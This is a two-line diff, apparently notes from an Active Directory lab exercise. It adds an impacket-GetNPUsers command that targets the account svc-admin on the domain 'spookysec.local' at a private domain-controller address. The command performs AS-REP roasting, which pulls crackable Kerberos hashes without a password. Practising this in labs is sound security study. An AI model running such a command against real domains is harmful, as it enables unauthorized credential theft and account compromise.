@@ -1,0 +1,2 @@
+impacket-GetNPUsers
+impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip 10.10.121.27 
